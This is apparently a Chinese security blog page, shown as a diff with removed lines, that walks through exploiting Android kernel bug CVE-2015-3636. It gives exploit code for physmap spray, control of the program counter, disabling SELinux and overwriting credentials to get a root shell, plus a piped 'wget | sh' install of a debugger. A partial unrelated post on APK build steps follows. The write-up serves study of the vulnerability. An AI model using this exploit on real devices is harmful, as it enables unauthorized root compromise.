-</li>
-</ul>
-<h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>我们可以先测一下这个EXP。EXP用的github上的：<a href="https://github.com/4B5F5F4B/Exploits/tree/master/Linux/CVE-2015-3636" target="_blank" rel="noopener">EXP</a>。</p>
-<p>不过要注意的是必须用adb shell过去然后su shell才能继承root的权限得到建立socket的权限。测试发现这个EXP确实是可用的，下面就开始调试。<img src="/2018/08/14/CVE-2015-3636/8.png" alt="8"></p>
-<p>调试时的命令如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-aarch64 -cpu cortex-a57 -machine <span class="built_in">type</span>=ranchu -m 1024 -append <span class="string">'console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0'</span> -serial mon:stdio -kernel Image -initrd /home/hjy/Desktop/android-problem-env/ramdisk.img -drive index=0,id=sdcard,file=/home/hjy/Desktop/android-problem-env/system.img -device virtio-blk-device,drive=sdcard -drive index=1,id=userdata,file=/home/hjy/Desktop/android-problem-env/.//userdata.img -device virtio-blk-device,drive=userdata -drive index=2,id=cache,file=/home/hjy/Desktop/android-problem-env/cache.img -device virtio-blk-device,drive=cache -drive index=3,id=system,file=/home/hjy/Desktop/android-problem-env/system.img -device virtio-blk-device,drive=system -netdev user,id=mynet -device virtio-net-device,netdev=mynet -show-cursor -nographic -L lib/pc-bios -gdb tcp::1234,ipv4 –S</span><br></pre></td></tr></table></figure>
-<p>这里又有一个很坑的地方，用NDK里面的gdb去调试会报Remote ‘g’ packet reply is too long。</p>
-<p>需要自己修改gdb源代码并且编译：参考=<a href="https://blog.csdn.net/bupt073114/article/details/25211319" target="_blank" rel="noopener">重新编译arm-linux-androideabi-gdb和gdbserver：</a></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://android.googlesource.com/toolchain/gdb.git</span><br></pre></td></tr></table></figure>
-<p>下载下来发现有gdb-7.11和gdb-8.0.1两个文件夹，由于pwndbg和GEF等插件目前好像还不支持gdb 8.x，所以我们选择gdb-7.11。</p>
-<p>找到gdb-7.11/gdb目录下的remote.c文件，注释掉这两行。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf_len &gt; <span class="number">2</span> * rsa-&gt;sizeof_g_packet)</span><br><span class="line">   error (_(“Remote ‘g’ packet reply is too <span class="keyword">long</span>: %s”), rs-&gt;buf);</span><br></pre></td></tr></table></figure>
-<p>在后面加上下面这几行：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf_len &gt; <span class="number">2</span> * rsa-&gt;sizeof_g_packet) </span><br><span class="line"> &#123;</span><br><span class="line">    rsa-&gt;sizeof_g_packet = buf_len ;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; gdbarch_num_regs (gdbarch); i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span> (rsa-&gt;regs[i].pnum == <span class="number">-1</span>)</span><br><span class="line">       <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">if</span> (rsa-&gt;regs[i].offset &gt;= rsa-&gt;sizeof_g_packet)</span><br><span class="line">       rsa-&gt;regs[i].in_g_packet = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       rsa-&gt;regs[i].in_g_packet = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p>编译安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --target=aarch64-linux-androideabi --prefix=/home/hjy/Desktop/gdb_build/gdb/gdb-7.11/arm-linux</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<p>安装GEF，因为很多人说pwndbg比较卡而GEF不卡。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br></pre></td></tr></table></figure>
-<p>开始调试了:</p>
-<p>不过还有一个小坑，我们应该用<code>gef-remote -q localhost:1234</code>也就是加上-q参数不然会报错:<a href="https://github.com/hugsy/gef/issues/124" target="_blank" rel="noopener">原因</a></p>
-<p>进入漏洞利用的部分：</p>
-<p>可以看到在main函数中整个漏洞触发漏洞的过程和POC中一样。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr1, <span class="keyword">sizeof</span>(addr1));</span><br><span class="line">system(<span class="string">"echo 4096 &gt; /proc/sys/vm/mmap_min_addr"</span>);</span><br><span class="line"><span class="keyword">void</span>* user_mm = mmap(PAGE_SIZE, MAX_NULLMAP_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br></pre></td></tr></table></figure>
-<p>修改mmap_min_addr并mmap就是为了避免崩溃这样才能执行到sock_put的逻辑。接下来的操作叫做physmap spray，大家如果对<code>CVE-2014-3153(towelroot)</code>还有印象的话，会记得它是通过sendmmsg修改内核数据的，keen在文章中解释了，通过sendmmsg完成堆喷的条件是存在漏洞的对象大小必须和SLAB分配器通常使用的大小一致。而在一些android设备上，PING sock对象的大小是576，不是期望的512或者1024。这样就很难对齐，利用会很不稳定，所以采用的是physmap spray的方法。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/9.png" alt="9"></p>
-<p>在内核中physmap在一个相对较高的地址，而SLAB通常在一个相对较低的地址，通过喷射其它的内核对象使得SLAB分配器在相对高的地址分配PING sock对象造成physmap和SLAB重叠，这个过程叫做<strong><em>lifting</em></strong>。这里的“其它的内核对象”直接用PING sock对象其实就可以。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/10.png" alt="10"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/11.png" alt="11"></p>
-<p>然后释放掉用来做lifting的PING sock对象，和physmap重叠的那一部分则留做触发漏洞。</p>
-<p>那么怎样才能知道什么时候PING sock对象已经被physmap中的数据填充了可以停止喷射以及怎样找到已经被填充的PING sock对象呢？</p>
-<p>在physmap spray中进行了大量的mmap操作，</p>
-<p>并且将<code>mapped_page+0x1D8</code>处赋值为<code>MAGIC_VALUE+physmap_spray_pages_count</code>，</p>
-<p>接下来<code>search_exploitable_socket</code>的时候用ioctl一个一个去试。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(exp_sock, SIOCGSTAMPNS, &amp;time);</span><br></pre></td></tr></table></figure>
-<p>这里的time是timespec结构体，会调用到sock_get_timestampns。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_get_timestampns</span><span class="params">(struct sock *sk, struct timespec __user *userstamp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!sock_flag(sk, SOCK_TIMESTAMP))</span><br><span class="line">        sock_enable_timestamp(sk, SOCK_TIMESTAMP);</span><br><span class="line">    ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line">    <span class="keyword">if</span> (ts.tv_sec == <span class="number">0</span>) &#123;</span><br><span class="line">        sk-&gt;sk_stamp = ktime_get_real();</span><br><span class="line">        ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copy_to_user(userstamp, &amp;ts, <span class="keyword">sizeof</span>(ts)) ? -EFAULT : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_get_timestampns);</span><br><span class="line"><span class="comment">//这个函数会返回sk-&gt;sk_stamp，在我们的环境中它在sock对象中的偏移正是0x1D8</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/14/CVE-2015-3636/12.png" alt="12"></p>
-<p>找到exp_sock之后因为它已经完全在我们的控制之中了，所以函数指针也是可控的，对其调用close函数就可以控制PC了。</p>
-<p>可以看到close是在inet_close中调用的。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_release</span><span class="params">(struct socket *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (sk) &#123;</span><br><span class="line">        <span class="keyword">long</span> timeout;</span><br><span class="line"> </span><br><span class="line">        sock_rps_reset_flow(sk);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Applications forget to leave groups before exiting */</span></span><br><span class="line">        ip_mc_drop_socket(sk);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* If linger is set, we don't return until the close</span></span><br><span class="line"><span class="comment">         * is complete.  Otherwise we return immediately. The</span></span><br><span class="line"><span class="comment">         * actually closing is done the same either way.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * If the close is due to the process exiting, we never</span></span><br><span class="line"><span class="comment">         * linger..</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        timeout = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (sock_flag(sk, SOCK_LINGER) &amp;&amp;</span><br><span class="line">            !(current-&gt;flags &amp; PF_EXITING))</span><br><span class="line">            timeout = sk-&gt;sk_lingertime;</span><br><span class="line">        sock-&gt;sk = <span class="literal">NULL</span>;</span><br><span class="line">        sk-&gt;sk_prot-&gt;close(sk, timeout);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(inet_release);</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/14/CVE-2015-3636/13.png" alt="13"></p>
-<p>找一下发现偏移是0x28，所以我们将<code>payload+0x28</code>设置为payload的地址，将payload开头设置为<code>0xFFFFFFC00035D788</code>让它跳到<code>kernel_setsockopt</code></p>
-<p><img src="/2018/08/14/CVE-2015-3636/14.png" alt="14"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x28</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)payload;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload)         = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D788</span>;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x68</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D7C0</span>;</span><br><span class="line">close(exp_sock);</span><br></pre></td></tr></table></figure>
-<p>addr_limit规定了特定线程的用户空间地址最大值，超过这个值的地址用户空间代码不能访问。</p>
-<p>所以把addr_limit改成0xffffffff就可以对内核为所欲为了</p>
-<p>现在我们已经来到了kernel_setsockopt，应该怎么改addr_limit呢？</p>
-<p>当内核需要去使用系统调用的时候就要去掉地址空间的限制，一般的流程是：</p>
-<ul>
-<li>(1)oldfs=get_fs()</li>
-<li>(2)set_fs(KERNEL_DS)</li>
-<li>(3)set_fs(oldfs)</li>
-</ul>
-<p>如果能绕过set_fs(oldfs)的执行，内核空间将一直对用户态打开，这样就绕过了限制。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">char</span> *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mm_segment_t</span> oldfs = get_fs();</span><br><span class="line">    <span class="keyword">char</span> __user *uoptval;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"> </span><br><span class="line">    uoptval = (<span class="keyword">char</span> __user __force *) optval;</span><br><span class="line"> </span><br><span class="line">    set_fs(KERNEL_DS);</span><br><span class="line">    <span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">        err = sock_setsockopt(sock, level, optname, uoptval, optlen);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = sock-&gt;ops-&gt;setsockopt(sock, level, optname, uoptval,</span><br><span class="line">                        optlen);</span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kernel_setsockopt);</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fs(x)  (current_thread_info()-&gt;addr_limit = (x))</span></span><br></pre></td></tr></table></figure>
-<p>注意这里因为我们控制了X0所以<code>BLR  X5</code>跳过了<code>STR  X20, [X19,#8]</code>。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/15.png" alt="15"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/16.png" alt="16"></p>
-<p>截一张mosec2016上360冰刃实验室讲的<a href="https://github.com/jianqiangzhao/mosec2016/blob/master/Android%20Root%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E6%BC%AB%E8%B0%88%EF%BC%9A%E7%BB%95%E8%BF%87PXN.ppt" target="_blank" rel="noopener">《Android Root利用技术漫谈：绕过PXN》</a>中的一张图帮助理解。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/17.png" alt="17"></p>
-<p>现在可以任意读写内核了,下一步是修改全局mmap_min_addr让我们能够在用户态mmap null地址。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   overwrite the global variable mmap_min_addr to 0, then we can mmap NULL in user-mode </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">data8 = <span class="number">0</span>; </span><br><span class="line">kernel_write8((<span class="keyword">void</span> *)<span class="number">0xffffffc000652148</span>, &amp;data8);</span><br><span class="line">user_mm = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(MAP_FAILED == user_mm)</span><br><span class="line">&#123;</span><br><span class="line">   perror(<span class="string">"[*] mmap NULL fail"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个地址应该怎么找呢?</p>
-<p>注意到setup_arg_pages中有mmap_min_addr。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/18.png" alt="18"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/19.png" alt="19"></p>
-<p><code>0xFFFFFFC00063EE9F+0x132A9=0xFFFFFFC000652148</code>就是这么来的。</p>
-<p>接下来关掉selinux，方法同上。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   overwirte selinux_enforcing to disable selinux</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">data4 = <span class="number">0</span>;</span><br><span class="line">kernel_write4((<span class="keyword">void</span> *)<span class="number">0xffffffc00065399c</span>, &amp;data4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] selinux disabled.\n"</span>);</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/14/CVE-2015-3636/20.png" alt="20"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/21.png" alt="21"></p>
-<p>在arm64系统上栈的最大深度为16K，所以<code>unsigned long thread_info_addr=sp&amp;0xFFFFFFFFFFFFC000</code></p>
-<p>task结构体的偏移是0x10，我们再次调用close，通过下面这段gadget把task结构体的指针leak到<code>0x0000000000000018</code>(X1是0)。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/22.png" alt="22"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(unsigned long *)((char *)payload + 0x290) = 0;</span><br><span class="line">*(unsigned long *)((char *)payload + 0x28)  = (unsigned long)payload;</span><br><span class="line">*(unsigned long *)((char *)payload)         = (unsigned long)0xFFFFFFC0004AA518;</span><br><span class="line">close(exp_sock);</span><br></pre></td></tr></table></figure>
-<p>接下来改掉task_struct-&gt;cred，整个提权过程就完成了。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      overwrite task_struct-&gt;cred to gain root privilege</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   task = <span class="literal">NULL</span>;</span><br><span class="line">   task = (<span class="keyword">void</span> *)*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)user_mm + <span class="number">0x18</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] task:%p\n"</span>, task); </span><br><span class="line"> </span><br><span class="line">   cred = <span class="literal">NULL</span>;</span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)task + <span class="number">0x398</span>, &amp;cred);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] cred:%p\n"</span>, cred);</span><br><span class="line"> </span><br><span class="line">   data4 = <span class="number">0</span>;</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred +  <span class="number">4</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred +  <span class="number">8</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">12</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">16</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">20</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">24</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">28</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">32</span>,  &amp;data4);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      cleanup to avoid crash. overwirte task_struct-&gt;files-&gt;fdt-&gt;max_fds to 0</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"> </span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)task + <span class="number">0x788</span>, &amp;files);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] files:%p\n"</span>, files);</span><br><span class="line"> </span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)files + <span class="number">8</span>, &amp;fdt);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] fdt:%p\n"</span>, fdt);</span><br><span class="line"> </span><br><span class="line">   data4 = <span class="number">0</span>;</span><br><span class="line">   kernel_write4(fdt, &amp;data4);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[*] congrats, enjoy your root shell.\n"</span>);</span><br><span class="line">      system(<span class="string">"/system/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Oops, you'd better have a cup of tea and try again:(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-<p>文章中另外涉及到的参考知识：</p>
-<p><a href="https://purzle.wordpress.com/2017/07/07/android-interals-part-4/" target="_blank" rel="noopener">Android Interals-Part4</a></p>
-<p><a href="https://www.kernel.org/doc/htmldocs/networking/API-struct-sock.html" target="_blank" rel="noopener">API-struct-sock.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/14/CVE-2015-3636/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Android程序的生成步骤" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/08/Android程序的生成步骤/">Android程序的生成步骤</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/08/Android程序的生成步骤/" class="archive-article-date">
-  	<time datetime="2018-08-08T09:14:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Android程序的生成步骤"><a href="#Android程序的生成步骤" class="headerlink" title="Android程序的生成步骤"></a>Android程序的生成步骤</h3><p><img src="/2018/08/08/Android程序的生成步骤/Apk打包.png" alt="Apk打包"></p>
-<ul>
-<li><strong>打包资源文件，生成R.java文件</strong><ul>
-<li>打包资源的工具aapt位于android-sdk\platform-tools目录下，该工具的源码在Android系统源码的frameworks\base\tools\aapt目录下<ul>
-<li>生成的过程主要是调用了aapt源码目录下Resource.cpp文件中的buildResources()函数</li>
-<li>该函数首先检查AndroidManifest.xml的合法性</li>
-<li>然后对res目录下的资源子目录进行处理，处理的函数为makeFileResources()，处理的内容包括资源文件名的合法性检查，向资源表table添加条目等</li>
-</ul>
-</li>
-<li>处理完后调用compileResourceFile()函数编译res与asserts目录下的资源并生成resources.arsc文件<ul>
-<li>compileResourceFile()函数位于aapt源码目录的ResourceTable.cpp文件中</li>
-<li>该函数最后会调用parseAndAddEntry()函数生成R.java文件</li>
-</ul>
-</li>
-<li>完成资源编译后，接下来调用compileXmlFile()函数对res目录的子目录下的xml文件分别进行编译</li>
-<li>将所有的资源与编译生成的resources.arsc文件以及“加密”过的AndroidManifest.xml文件打包压缩成resources.ap_文件<ul>
-<li>使用Ant工具命令行编译则会生成与build.xml中“project name”指定的属性同名的ap_文件</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>处理aidl文件，生成相应的Java文件</strong><ul>
-<li>对于没有使用到aidl的Android工程，这一步可以跳过。</li>
-<li>使用到的工具为aidl，位于android-sdk\platform-tools目录下</li>
-<li>aidl工具解析接口定义文件并生成相应的Java代码供程序调用，源码frameworks\base\tools\aidl目录下<ul>
-<li>aidl为android interface definition language的首字母缩写，即Android接口描述语言</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>编译工程源代码，生成相应的class文件</strong><ul>
-<li>调用javac编译工程src目录下所有的java源文件，生成的class文件位于工程的bin\classes目录</li>
-</ul>
-</li>
-<li><strong>转换所有的class文件，生成classes.dex文件</strong><ul>
-<li>程序运行所需的classes.dex为Dalvik可执行文件</li>
-<li>使用到的工具为dx，它位于android-sdk\platform-tools目录下</li>
-<li>dx工具主要的工作是将Java字节码转换为Dalvik字节码、压缩常量池、消除冗余信息</li>
-</ul>
-</li>
-<li><strong>打包生成APK文件</strong><ul>
-<li>打包的工具为apkbuilder，它位于android-sdk\tools目录下</li>
-<li>apkbuilder为一个脚本文件，实际调用的是android-sdk\tools\lib\sdklib.jar文件中的com.android.sdklib.build.ApkBuilderMain类。</li>
-<li>实现代码位于Android系统源码的sdk\sdkmanager\libs\sdklib\src\com\android\sdklib\build\ApkBuilderMain.java文件，代码构建了一个ApkBuilder类</li>
-<li>以包含resources.arsc的文件为基础生成apk文件，这个文件一般为ap_结尾的文件</li>
-<li>接着调用addSourceFolder()函数添加工程的资源<ul>
-<li>addSourceFolder()会调用processFileForResource()函数往apk文件中添加资源</li>
-<li>处理的内容包括res目录与assets目录中的文件</li>
-</ul>
-</li>
-<li>添加完资源后调用addResourcesFromJar()函数往apk文件中写入依赖库</li>
